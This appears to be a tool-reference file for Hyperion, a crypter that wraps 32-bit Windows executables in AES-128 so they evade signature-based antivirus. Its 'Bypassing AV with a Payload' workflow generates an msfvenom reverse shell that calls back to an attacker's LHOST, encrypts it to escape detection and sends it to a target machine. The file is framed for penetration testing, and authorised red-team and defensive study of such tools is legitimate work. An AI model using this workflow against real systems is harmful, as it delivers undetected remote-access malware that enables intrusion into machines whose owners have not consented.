description: Encrypt 32-bit Windows Portable Executable (PE) files using AES-128 to bypass signature-based antivirus detection. Use when performing payload obfuscation, red teaming, or exploitation during penetration testing to wrap executables in a runtime decrypter that brute-forces its own key upon execution.

# hyperion

## Overview
Hyperion is a runtime encrypter for 32-bit portable executables (PE). It serves as a reference implementation for PE-Crypter technology, encrypting an input executable with AES-128. The resulting file decrypts itself at runtime by brute-forcing the AES key (typically taking a few seconds), which helps evade static analysis and signature-based detection. Category: Exploitation / Windows Resources.

## Installation (if not already installed)
Assume hyperion is already installed. If the command is missing:

```bash
sudo apt install hyperion
```

## Common Workflows

### Encrypting a Windows Executable
To encrypt a standard 32-bit PE file (e.g., a reverse shell generated by msfvenom):
```bash
hyperion /path/to/input.exe /path/to/output.exe
```

### Bypassing AV with a Payload
1. Generate a payload (e.g., `msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe`).
2. Obfuscate with Hyperion:
```bash
hyperion shell.exe crypted_shell.exe
```
3. Transfer `crypted_shell.exe` to the target Windows machine.

## Complete Command Reference

Hyperion is a straightforward command-line utility that takes an input file and produces an encrypted output file.

```bash
hyperion <input_executable> <output_executable>
```

### Arguments

| Argument | Description |
|----------|-------------|
| `<input_executable>` | The path to the 32-bit Windows PE file you wish to encrypt. |
| `<output_executable>` | The path where the encrypted/obfuscated PE file will be saved. |

### Technical Details
- **Encryption Algorithm**: AES-128.
- **Decryption Method**: The output file contains a stub that brute-forces the AES key at runtime.
- **Logging**: The encrypted executable generates a log file for debugging purposes upon execution on the target system.

## Notes
- **Architecture Limitation**: Hyperion is specifically designed for **32-bit** portable executables. It may not function correctly with 64-bit binaries.
- **Detection**: While Hyperion helps bypass simple signature-based detection, the decryption stub itself may be flagged by advanced heuristic or behavioral analysis engines.
- **Execution Delay**: Because the stub brute-forces the key, there is a noticeable delay (usually a few seconds) between running the file and the actual payload execution.
- **Dependencies**: When running on Kali, Hyperion is often used in conjunction with `wine` if you are compiling or testing the resulting binaries, though the `hyperion` command itself runs natively.
